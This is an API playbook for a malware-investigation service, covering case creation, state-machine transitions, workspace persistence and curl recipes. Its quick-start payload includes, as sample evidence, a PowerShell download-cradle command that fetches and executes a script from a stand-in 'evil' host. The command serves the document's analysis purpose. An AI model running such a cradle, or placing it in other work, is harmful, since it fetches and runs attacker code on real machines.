# NivXRay · L1 Investigation API Playbook

**Applies to**: PR-2 endpoints under `/api/investigation/*`
**Audience**: ARB reviewers · QA · testing agent · downstream integrators (SIEM adapters)
**Auth**: JWT bearer (obtain via `POST /api/auth/login`)
**Status**: Frozen for PR-3+ UI wiring. Any wire-shape change requires a Blueprint amendment + ARB re-approval.

---

## 1 · Quick-start

```bash
# 1. Log in and cache the token.
API="${REACT_APP_BACKEND_URL:-http://localhost:8001}"
TOKEN=$(curl -s -X POST "$API/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@nivxray.com","password":"YOUR_PASSWORD_HERE"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
H="Authorization: Bearer $TOKEN"

# 2. Create a case from a minimal EvidenceBundle payload.
curl -s -X POST "$API/api/investigation" -H "$H" -H 'Content-Type: application/json' -d '{
  "bundle": {
    "case_id": "demo-01",
    "certificate": {"canonical_state": true, "ready_for_behavioral_analysis": true},
    "canonical_output": "powershell -c iex (New-Object Net.WebClient).DownloadString(\"http://evil/x\")",
    "sample": {"family":"cobalt_strike","technique":"download_cradle"}
  }
}' | python3 -m json.tool
```

The response is the initial Workspace State (mode/lens/state) and `case_id`.

---

## 2 · Endpoint index

| Method | Path | Description | Body / Params |
|---|---|---|---|
| `POST` | `/api/investigation` | Create case | `{bundle, mode?}` |
| `GET` | `/api/investigation` | List cases (owner-scoped) | — |
| `GET` | `/api/investigation/{case_id}` | Single-call workspace bundle | — |
| `DELETE` | `/api/investigation/{case_id}` | Delete case | — |
| `GET` | `/api/investigation/{case_id}/workspace` | Read Workspace State (§8.3) | — |
| `PUT` | `/api/investigation/{case_id}/workspace` | Persist Workspace State (idempotent) | `{mode?, active_lens?, scroll_positions?, selected_evidence_id?, filters?, timeline_position?}` |
| `GET` | `/api/investigation/{case_id}/state` | Current state + history + allowed states | — |
| `POST` | `/api/investigation/{case_id}/state/transition` | Advance state machine (§8.1) | `{target, reason?}` |
| `GET` | `/api/investigation/{case_id}/summary` | Executive Summary L2 service | — |
| `GET` | `/api/investigation/{case_id}/story` | Attack Story L2 service | — |
| `GET` | `/api/investigation/{case_id}/iocs` | IOC Intelligence L2 service | — |
| `GET` | `/api/investigation/{case_id}/capabilities` | Capability Explorer L2 service | — |
| `GET` | `/api/investigation/{case_id}/threat` | Threat Assessment L2 service | — |
| `GET` | `/api/investigation/{case_id}/detections` | Detection Rules L2 (P0 #3) | — |
| `GET` | `/api/investigation/{case_id}/hunting` | Hunting Queries L2 | — |

---

## 3 · Wire-shape contracts

### 3.1 · EvidenceBundle (input for `POST /api/investigation`)

```json
{
  "case_id": "string · optional (server generates if absent)",
  "certificate": {
    "canonical_state": true,
    "ready_for_behavioral_analysis": true,
    "iterations_executed": 4,
    "engine_version": "M1-1.0.0"
  },
  "canonical_output": "string",
  "transformations": [
    {
      "iteration": 0,
      "pass_name": "structural|content|decoder|semantic",
      "transformation": "string · registry id",
      "changed": true,
      "before_hash": "hex64",
      "after_hash":  "hex64"
    }
  ],
  "iocs": [
    {
      "ioc_id": "string · deterministic id",
      "ioc_type": "url|ip|domain|sha256|md5|email|filepath",
      "value": "string",
      "source_iteration": 3,
      "source_span": [37, 65],
      "context": "string · optional"
    }
  ],
  "capabilities": [
    {
      "capability_id": "EXEC.POWERSHELL",
      "display_name": "PowerShell Execution",
      "confidence": "high|medium|low",
      "source_iterations": [0]
    }
  ],
  "mitre": [
    {
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "via_capability": "EXEC.POWERSHELL",
      "source_iterations": [0]
    }
  ],
  "sample": {
    "family": "cobalt_strike",
    "technique": "download_cradle",
    "variant": "ps_download_string",
    "sample_id": "CS-2026-08-04-0001"
  }
}
```

### 3.2 · WorkspaceState (`GET|PUT /workspace`)

```json
{
  "case_id": "string",
  "mode": "quick_triage|investigation|deep_analysis",
  "active_lens": "summary|story|timeline|evidence|analysis|exports",
  "scroll_positions": {"summary": 0, "evidence": 420},
  "selected_evidence_id": "string | null",
  "filters": {"mitre": ["T1059.001"], "hide_noise": true},
  "timeline_position": 0,
  "investigation_state": "new|collecting|correlating|reviewing|completed|reported|reopened"
}
```

### 3.3 · State Machine transitions (`POST /state/transition`)

Request:

```json
{ "target": "collecting", "reason": "input received" }
```

Response:

```json
{
  "case_id": "demo-01",
  "current_state": "collecting",
  "transition": {
    "from_state": "new",
    "to_state": "collecting",
    "actor": "admin@nivxray.com",
    "reason": "input received"
  },
  "history": [ { "from_state": "new", "to_state": "collecting", "actor": "...", "reason": "..." } ]
}
```

**Legal edges** (Blueprint §8.1):

```
new         → collecting
collecting  → correlating
correlating → reviewing
reviewing   → completed
completed   → reported
reported    → reopened
reopened    → correlating
```

Anything else returns `409 Conflict`. Bad enum returns `400 Bad Request`.

### 3.4 · ServiceOutput envelope (all `GET /*` service reads)

```json
{
  "service":    "executive_summary",
  "version":    "0.1.0-scaffold",
  "case_id":    "demo-01",
  "body":       { ... service-specific ... },
  "fingerprint": "sha256hex"
}
```

`fingerprint` is deterministic — two consecutive GETs return the same value. Client UIs use it as an ETag-style cache key.

### 3.5 · Single-call `workspace_bundle` (`GET /api/investigation/{case_id}`)

```json
{
  "case_id":  "demo-01",
  "state":    "collecting",
  "workspace": { ...WorkspaceState... },
  "output": {
    "service": "workspace_bundle",
    "version": "0.1.0-scaffold",
    "case_id": "demo-01",
    "body": {
      "evidence_fingerprint": "sha256hex",
      "services": {
        "attack_story":       { ...ServiceOutput... },
        "capability_explorer":{ ...ServiceOutput... },
        "detection_rules":    { ...ServiceOutput... },
        "executive_summary":  { ...ServiceOutput... },
        "hunting_queries":    { ...ServiceOutput... },
        "ioc_intelligence":   { ...ServiceOutput... },
        "threat_assessment":  { ...ServiceOutput... }
      }
    }
  },
  "fingerprint": "sha256hex"
}
```

**One call · seven lenses hydrated · deterministic**. This is the endpoint the L4 Workspace shell (PR-3) will call on mount and after any state transition.

---

## 4 · Copy-paste curl recipes

```bash
# Full end-to-end investigation lifecycle.
API="${REACT_APP_BACKEND_URL:-http://localhost:8001}"
H="Authorization: Bearer $TOKEN"
CID="demo-lifecycle-01"

# Create
curl -s -X POST "$API/api/investigation" -H "$H" -H 'Content-Type: application/json' \
  -d "{\"bundle\":{\"case_id\":\"$CID\",\"certificate\":{\"canonical_state\":true,\"ready_for_behavioral_analysis\":true},\"canonical_output\":\"iex ...\",\"sample\":{\"family\":\"cobalt_strike\"}}}"

# Hydrate (single call)
curl -s "$API/api/investigation/$CID" -H "$H" | python3 -m json.tool | head -40

# Move through the state machine
for target in collecting correlating reviewing completed reported; do
  curl -s -X POST "$API/api/investigation/$CID/state/transition" -H "$H" \
    -H 'Content-Type: application/json' -d "{\"target\":\"$target\"}"
  echo
done

# Persist Workspace State (mode switch to deep_analysis)
curl -s -X PUT "$API/api/investigation/$CID/workspace" -H "$H" \
  -H 'Content-Type: application/json' \
  -d '{"mode":"deep_analysis","active_lens":"evidence","scroll_positions":{"evidence":420},"timeline_position":3}'

# Re-read to confirm persistence
curl -s "$API/api/investigation/$CID/workspace" -H "$H" | python3 -m json.tool

# Reopen (Blueprint §8.1 reopened → correlating loop)
curl -s -X POST "$API/api/investigation/$CID/state/transition" -H "$H" \
  -H 'Content-Type: application/json' -d '{"target":"reopened","reason":"analyst re-examined evidence"}'
curl -s -X POST "$API/api/investigation/$CID/state/transition" -H "$H" \
  -H 'Content-Type: application/json' -d '{"target":"correlating"}'

# Full audit log
curl -s "$API/api/investigation/$CID/state" -H "$H" | python3 -m json.tool

# Cleanup
curl -s -X DELETE "$API/api/investigation/$CID" -H "$H" -w 'delete:%{http_code}\n'
```

---

## 5 · Error contract

| Status | When |
|---|---|
| `400` | Invalid enum value (`mode`, `active_lens`, `target`) |
| `401` / `403` | Missing / invalid JWT, or case owned by another user |
| `404` | `case_id` not found |
| `409` | Case already exists (POST) · illegal state transition |
| `422` | Pydantic body validation error |

---

## 6 · Determinism guarantees

Every GET is a **pure read**. Two consecutive GETs against the same `case_id`:

- Same JSON body (byte-identical).
- Same `fingerprint` (SHA-256 of the canonical JSON body).

This is exercised in the test suite (`tests/l2_investigation/test_api_pr2.py`) and re-verified via `dcs_runner --strict` and `r1_runner --strict` in every PR going forward.

---

## 7 · What is NOT here (roadmap)

- No content generation — the L2 services currently emit deterministic scaffolds. Real content lands per-service in PR-4/5/6.
- No file upload / no L0 → EvidenceBundle bridge — PR-3 introduces the input surface.
- No exports (PDF / DOCX / STIX / Sigma / KQL / YARA) — planned for PR-6 and P0 #2.
- No SIEM push (Splunk / Sentinel / MISP) — planned for P0 #5.

---

**Frozen contract · PR-2 · 2026-08-04**
